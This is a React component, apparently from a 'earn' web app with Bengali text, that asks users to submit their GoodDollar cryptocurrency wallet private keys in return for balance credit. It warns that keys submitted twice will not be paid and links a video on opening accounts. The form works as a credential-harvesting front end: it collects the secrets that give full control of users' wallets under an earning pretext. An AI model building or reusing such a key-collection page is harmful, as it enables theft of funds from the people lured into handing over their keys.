
import { useState } from "react";
import { useSubmitKey } from "@/hooks/use-earn";
import { Key, Loader2, ArrowRight, Video } from "lucide-react";
import { motion } from "framer-motion";

export function KeySubmitter() {
  const [key, setKey] = useState("");
  const { mutate: submitKey, isPending } = useSubmitKey();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!key.trim()) return;
    submitKey({ privateKey: key }, {
      onSuccess: () => setKey("")
    });
  };

  return (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.1 }}
      className="glass-card rounded-2xl p-6"
    >
      <div className="flex items-center gap-3 mb-4">
        <div className="p-2 bg-primary/20 rounded-lg">
          <Key className="w-6 h-6 text-primary" />
        </div>
        <h2 className="text-xl font-bold text-white">GoodDollar প্রাইভেট কি জমা দিন</h2>
      </div>

      <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-4 mb-6">
        <p className="text-sm text-destructive font-bold mb-1">সতর্কতা নোটিশ:</p>
        <p className="text-xs text-destructive/90 leading-relaxed">
          একটি প্রাইভেট কি ২ বার সাবমিট করলে পেমেন্ট করা হবে না। সঠিক প্রাইভেট কি সাবমিট করুন। ভুল কি দিলে ব্যালেন্স যোগ হবে না।
        </p>
      </div>
      
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-muted-foreground mb-2">
            আপনার ১২-ডিজিটের প্রাইভেট কি লিখুন
          </label>
          <input
            type="text"
            value={key}
            onChange={(e) => setKey(e.target.value)}
            placeholder="এখানে কি লিখুন..."
            className="input-field font-mono text-lg tracking-wider"
            disabled={isPending}
          />
        </div>

        <button 
          type="submit" 
          disabled={isPending || !key}
          className="btn-primary"
        >
          {isPending ? (
            <Loader2 className="w-5 h-5 animate-spin" />
          ) : (
            <div className="flex items-center justify-center gap-2">
              <span>সাবমিট করুন</span>
              <ArrowRight className="w-5 h-5" />
            </div>
          )}
        </button>
        <p className="text-xs text-center text-muted-foreground mt-2">
          অপেক্ষা করুন: যাচাই করতে ২-৫ মিনিট সময় লাগতে পারে
        </p>
      </form>

      <div className="mt-8 pt-6 border-t border-white/5">
        <div className="flex items-center gap-2 mb-4 text-primary">
          <Video className="w-5 h-5" />
          <h3 className="font-bold">কিভাবে একাউন্ট খুলবেন?</h3>
        </div>
        <p className="text-sm text-muted-foreground mb-4 leading-relaxed">
          আপনি যদি একাউন্ট খুলতে না পারেন বা কোনো সমস্যায় পড়েন, তবে নিচের ভিডিওটি দেখে খুব সহজেই একাউন্ট খুলতে পারবেন:
        </p>
        <a 
          href="https://youtu.be/RvNhXcHKxl8?si=XU5IHbcqjL-hsf_2" 
          target="_blank" 
          rel="noopener noreferrer"
          className="btn-secondary flex items-center justify-center gap-2 text-sm"
        >
          ভিডিওটি দেখুন <ArrowRight className="w-4 h-4" />
        </a>
      </div>
    </motion.div>
  );
}
